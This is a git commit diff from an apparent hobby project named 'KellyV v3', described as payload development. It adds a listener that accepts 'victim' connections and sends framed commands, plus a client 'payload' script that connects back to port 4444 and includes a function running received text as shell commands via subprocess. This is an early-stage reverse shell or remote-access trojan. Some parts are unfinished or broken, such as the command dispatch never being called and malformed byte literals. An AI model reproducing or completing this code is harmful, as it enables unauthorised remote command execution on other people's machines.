17d401f610a34a6de24863b47c583db57d498f54
XxHeavyHippoxX <eric.jacobson@telia.com>
2022-06-02 20:22:29 +0200

    Payload development and added functions
    did just whats in the title

--- KellyV v3/functions.py
+++ KellyV v3/functions.py
@@ -1,12 +1,15 @@
+import queue as q
 import socket as s
-import time as t
 import sys
 import threading
-import queue as q
-
-sys.path.insert(1, '/Users/ericjacobson/Documents/GitHub/KellyV/KellyV v3/payload')
+import time as t
 
 victimQueue = q.Queue()
+
+closeConnectionMessage = b'\x10\x10\x10\x10\c\l\c\o\x11\x11\x11\x11'
+shellCmdMessage = b'\x10\x10\x10\x10\x65\x78\x73\x68\x63\x6d\x11\x11\x11\x11'
+nextByteBufferSize = b'\x6e\x62\x62\x73'
+
 
 def startListener(lhost: str, lport: int, **kwargs):
     server = s.socket(s.AF_INET, s.SOCK_STREAM)
@@ -16,17 +19,20 @@ def startListener(lhost: str, lport: int, **kwargs):
     victim, victim_addr = server.accept()
     victimQueue.put((victim, victim_addr))
 
-thr = threading.Thread(target=startListener, args=("localhost", 4444,))
-thr.start()
-
 
 def closeConnection(victim: s.SOCK_STREAM):
-    victim.close()
-
-v, va
+    victim.send(closeConnectionMessage)
 
 
-v.send("i fart".encode())
-t.sleep(5)
-closeConnection(v)
+def execShellCmd(victim: s.SOCK_STREAM, command: str):
+    victim.send(shellCmdMessage + command.encode())
 
+
+def updateBufferSize(victim: s.SOCK_STREAM, size: int):
+    victim.send(nextByteBufferSize + size.to_bytes((size.bit_length() + 7) // 8, 'big'))
+
+startListener("localhost", 4444)
+
+v, va = victimQueue.get_nowait()
+updateBufferSize(v, 10)
+updateBufferSize(v, 400)
--- KellyV v3/payload/pythonpayload.py
+++ KellyV v3/payload/pythonpayload.py
@@ -1,9 +1,63 @@
 import socket as s
+import sys
+import time as t
+import subprocess
 
-connection = s.socket()
+bufferSize = 5
 
-connection.connect(("localhost", 4444))
+closeConnectionMessage = b'\x10\x10\x10\x10\x63\x6c\x63\x6f\x11\x11\x11\x11'
+shellCmdMessage = b'\x10\x10\x10\x10\x65\x78\x73\x68\x63\x6d\x11\x11\x11\x11'
+nextByteBufferSize = b'\x6e\x62\x62\x73'
+
+
+def execShellCmd(cmd: str):
+    shell = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE,
+                             stdin=subprocess.PIPE)
+    out = shell.stdout.read()
+    error = shell.stderr.read()
+    return out, error
+
+
+def closeConnection(con: s.SOCK_STREAM):
+    con.close()
+
+
+def updateBufferSize(size: int):
+    return size
+
+
+commandSwitcher = {
+    closeConnectionMessage: lambda con: closeConnection(con),
+    shellCmdMessage: lambda cmd: execShellCmd(cmd),
+    nextByteBufferSize: lambda size: size,
+    
+}
 
 while True:
-    recv = connection.recv(10).decode()
-    print(recv)
+    try:
+
+        connection = s.socket()
+
+        connection.connect(("localhost", 4444))
+
+        while True:
+            t.sleep(1)
+            recv = connection.recv(bufferSize)
+            print(recv)
+            if recv.startswith(b'\x10\x10\x10\x10'):
+                start = recv.find(b"\x10\x10\x10\x10") + len(b'\x10\x10\x10\x10')
+                print(start)
+                end = recv.find(b'\x11\x11\x11\x11')
+                command = recv[start: end]
+                print(command)
+            if recv.startswith(nextByteBufferSize):
+                bufferSize = int.from_bytes(recv[4], "big")
+                print(bufferSize)
+                print(len(nextByteBufferSize))
+
+
+
+
+
+    except Exception as eee:
+        print("PAYLOAD SCRIPT ERROR: " + str(eee))
